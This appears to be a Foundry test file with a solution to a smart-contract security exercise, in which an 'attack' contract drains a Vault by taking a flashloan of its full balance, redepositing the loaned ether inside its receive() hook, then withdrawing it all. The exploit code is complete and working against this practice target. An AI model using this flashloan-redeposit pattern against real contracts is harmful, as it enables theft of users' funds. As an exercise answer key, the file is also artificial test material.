// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Vault} from "../src/03-Flashloan.sol";

contract CallerTest is Test {
    Vault public vault;

    function setUp() public {
        vault = new Vault();

        address user = makeAddr("USER");
        hoax(user);
        vault.deposit{value: 10 ether}();
    }

    function test_Flashloan() public {
        address attacker = makeAddr("ATTACKER");
        vm.deal(attacker, 1 ether);

        vm.startPrank(attacker);

        // START OF SOLUTION
        // (You can create any additional contract if needed)
        attack attackerContract = new attack{value:1 ether}(address(vault));
        attackerContract.makeAttack();
        attackerContract.withdraw();
        

        // END OF SOLUTION

        uint256 vaultBalance = address(vault).balance;
        assertEq(vaultBalance, 0, "Vault still has balance");

        uint256 attackerBalance = address(attacker).balance;
        assertEq(attackerBalance, 11 ether, "Attacker didn't get the assets");
    }
}

contract attack {

    Vault victim;

    bool attacked;
    constructor(address _vault) payable{
        victim = Vault(_vault);
    }

    function makeAttack() public {
        victim.flashloan(address(victim).balance);
    }

    receive() external payable {
        if (!attacked) {
            attacked = true;
            victim.deposit{value: msg.value}();
        }
        
    }

    function withdraw() public {
        victim.withdraw();
        msg.sender.call{value: address(this).balance}("");
    }

}
